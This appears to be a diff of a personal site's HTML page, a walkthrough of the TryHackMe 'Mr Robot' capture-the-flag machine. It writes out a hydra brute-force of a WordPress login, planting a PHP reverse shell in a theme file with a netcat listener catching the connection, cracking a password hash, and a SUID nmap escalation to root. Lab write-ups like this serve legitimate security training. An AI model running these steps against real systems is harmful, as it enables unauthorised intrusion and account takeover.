@@ -7,59 +7,163 @@
   <link rel="stylesheet" href="../css/style.css">
 </head>
 <body>
-  <!-- Header remains the same -->
-
+  <header>
+    <h1>Mr. Robot CTF Walkthrough</h1>
+    <nav>
+      <ul>
+        <li><a href="../index.html">Home</a></li>
+      </ul>
+    </nav>
+  </header>
   <main>
     <section class="writeup-card">
+      <h2>Introduction</h2>
+      <p><strong>Name:</strong> Mr Robot CTF</p>
+      <p><strong>Challenge type:</strong> Boot2Root machine</p>
+      <p><strong>Rated difficulty:</strong> Medium</p>
+      <p><strong>Link:</strong> <a href="https://tryhackme.com/room/mrrobot" target="_blank">https://tryhackme.com/room/mrrobot</a></p>
+    </section>
+
+    <section class="writeup-card">
       <h2>Nmap Scan Results</h2>
-      <p>Let's start by scanning open ports on the target machine:</p>
-      
+      <p>Let's start by scanning open ports on the target machine. Here's what <code>nmap</code> revealed:</p>
       <pre><code>PORT    STATE  SERVICE  VERSION
 80/tcp  open   http     Apache httpd
 |_http-server-header: Apache
 |_http-title: Site doesn't have a title (text/html).
 443/tcp open   ssl/http Apache httpd
 |_http-server-header: Apache
-|_http-title: Site doesn't have a title (text/html).</code></pre>
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+MAC Address: 02:6E:76:1C:2E:07 (Unknown)</code></pre>
+      <p>Ports 80 and 443 are open running Apache, but neither site has a proper title or header.</p>
     </section>
 
     <section class="writeup-card">
       <h2>Enumerating HTTP and HTTPS</h2>
-      <p>Here's a look at robots.txt:</p>
-      
+      <p>Interacting with the HTTP and HTTPS services didn't immediately reveal much. Here's a look at <code>robots.txt</code> which caught my attention:</p>
       <pre><code>User-agent: *
 fsocity.dic
 key-1-of-3.txt</code></pre>
+      <p>Looks like we found the first key file <code>key-1-of-3.txt</code> and a wordlist named <code>fsocity.dic</code>.</p>
 
-      <p>Downloading the wordlist:</p>
-      
+      <p>Downloading the wordlist with wget:</p>
       <pre class="command">wget http://10.10.99.69/fsocity.dic</pre>
 
-      <p>Cleaning the wordlist:</p>
-      
-      <pre class="command">sort fsocity.dic | uniq -d > clean-dic.txt</pre>
+      <p>The file contains tons of duplicate words:</p>
+      <pre><code>angela
+angela
+angela
+...</code></pre>
 
-      <p>Gobuster results:</p>
-      
+      <p>So I cleaned it up by removing duplicates:</p>
+      <pre class="command">sort fsocity.dic | uniq -d &gt; clean-dic.txt</pre>
+
+      <p>Running <code>gobuster</code> on the site revealed it's running Wordpress:</p>
       <pre><code>/wp-content           (Status: 301)
 /admin                (Status: 301)
 /audio                (Status: 301)
 /intro                (Status: 200)</code></pre>
+
+      <p>Accessing <code>/wp-login.php</code> gave me a login page where username enumeration was possible.</p>
+
+      <div class="image-container">
+        <p><em>Here, I tested some usernames and confirmed we can enumerate usernames.</em></p>
+        <img src="../images/mrrobot/username-enum.png" alt="Username enumeration on login page">
+      </div>
+
+      <div class="image-container">
+        <p><em>Confirmed 'elliot' is a valid username, while guessing main Mr. Robot characters</em></p>
+        <img src="../images/mrrobot/valid-user.png" alt="Valid username elliot found">
+      </div>
+
+      <p>Next, I brute forced the login using <code>hydra</code> with the cleaned dictionary and username 'elliot':</p>
+      <pre class="command">hydra -l elliot -P clean-dic.txt 10.10.99.69 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered for the username"</pre>
+
+      <p>Hydra found a valid password for <code>elliot</code>!</p>
+      <pre><code>elliot:XXXXXXX</code></pre>
+
+      <p>After logging in, going to Appearance → Editor gives us a form to edit theme files.</p>
+
+      <div class="image-container">
+        <p><em>Here is the editor where I can modify theme files.</em></p>
+        <img src="../images/mrrobot/theme-editor.png" alt="Wordpress theme editor">
+      </div>
+
+      <p>I edited the 404.php template with a PHP reverse shell (from <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener noreferrer">pentestmonkey's repo</a>), adding my IP and port.</p>
+
+      <div class="image-container">
+        <p><em>After updating the 404.php with the reverse shell code.</em></p>
+        <img src="../images/mrrobot/reverse-shell-injected.png" alt="Injected reverse shell into 404.php">
+      </div>
+
+      <p>Remember to start your listener:</p>
+      <pre class="command">nc -lvnp 1337</pre>
+
+      <p>Visiting a non-existent page triggers the reverse shell, and I got a shell as user <code>daemon</code>:</p>
+      <pre><code>nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.4.7.139] from (UNKNOWN) [10.10.99.69] 39735
+$ whoami
+daemon</code></pre>
     </section>
 
     <section class="writeup-card">
       <h2>Privilege Escalation</h2>
-      <p>Checking for SUID binaries:</p>
-      
-      <pre class="command">find / -perm -u=s -type f 2>/dev/null</pre>
+      <p>Looking inside <code>/home/robot</code> I found two files:</p>
+      <pre><code>-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5</code></pre>
 
-      <p>Exploiting nmap:</p>
-      
-      <pre><code>nmap --interactive
-nmap> !sh
+      <p>I couldn't read the second key, but I could read the password hash:</p>
+      <pre><code>robot:c3fcd3d76192e4007dfb496cca67e13b</code></pre>
+
+      <p>I took the hash to <a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer">CrackStation</a> and got the password!</p>
+
+      <div class="image-container">
+        <p><em>Screenshot of cracked password on CrackStation.</em></p>
+        <img src="../images/mrrobot/hash.png" alt="Password cracked on CrackStation">
+      </div>
+
+      <p>Trying to switch user with <code>su robot</code> initially failed because the shell was unstable:</p>
+      <pre><code>su: must be run from a terminal</code></pre>
+
+      <p>I stabilized the shell with:</p>
+      <pre class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</pre>
+
+      <p>After that, we can switch to the <code>robot</code> user successfully.</p>
+    </section>
+
+    <section class="writeup-card">
+      <h2>Getting Root</h2>
+      <p>After more enumeration, I didn't find much at first. Then I checked for SUID binaries:</p>
+      <pre class="command">find / -perm -u=s -type f 2>/dev/null</pre>
+      <pre><code>/bin/ping
+/bin/umount
+/bin/mount
+...
+/usr/local/bin/nmap
+...</code></pre>
+
+      <p>If you've done Boot2Root machines before, you know <code>nmap</code> with SUID is suspicious. Checking <a href="https://gtfobins.github.io/gtfobins/nmap/" target="_blank" rel="noopener noreferrer">GTFOBins</a> confirmed it.</p>
+
+      <div class="image-container">
+        <p><em>GTFOBins nmap exploit snippet.</em></p>
+        <img src="../images/mrrobot/gtfobins.png" alt="GTFOBins nmap SUID exploit">
+      </div>
+
+      <p>Exploiting the SUID <code>nmap</code> binary to spawn a root shell:</p>
+      <pre class="command">nmap --interactive</pre>
+      <pre><code>nmap> !sh
 # whoami
 root</code></pre>
+
+      <p>This machine was very fun. The final key was in <code>/root</code>.</p>
     </section>
   </main>
+  <footer>
+    <p>&copy; 2025 Axoryn. All rights reserved.</p>
+  </footer>
 </body>
 </html>
